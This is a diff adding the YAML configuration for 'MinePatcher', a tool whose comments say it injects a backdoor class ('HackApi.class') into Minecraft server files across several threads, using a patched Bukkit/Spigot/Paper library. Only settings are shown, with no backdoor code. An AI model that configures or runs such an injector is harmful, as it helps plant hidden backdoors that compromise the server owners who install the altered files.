@@ -1,0 +1,21 @@
+##  ░█▀▄▀█ ─▀─ █▀▀▄ █▀▀ ░█▀▀█ █▀▀█ ▀▀█▀▀ █▀▀ █──█ █▀▀ █▀▀█
+##  ░█░█░█ ▀█▀ █──█ █▀▀ ░█▄▄█ █▄▄█ ──█── █── █▀▀█ █▀▀ █▄▄▀
+##  ░█──░█ ▀▀▀ ▀──▀ ▀▀▀ ░█─── ▀──▀ ──▀── ▀▀▀ ▀──▀ ▀▀▀ ▀─▀▀
+##
+## by HastG9. v2.0
+##
+
+# Input file path. Leave blank if you want to enter it when starting the program.
+input: ''
+
+# Output file path. Leave blank if you want to enter it when starting the program.
+output: ''
+
+# The number of threads on which the injection will run.
+threads: 10
+
+# The name of the class with the backdoor located in "inject" directory.
+hack-api: 'HackApi.class'
+
+# Bukkit/Spigot/Paper server core library.
+server-api: 'lib/patched_1.12.2.jar'
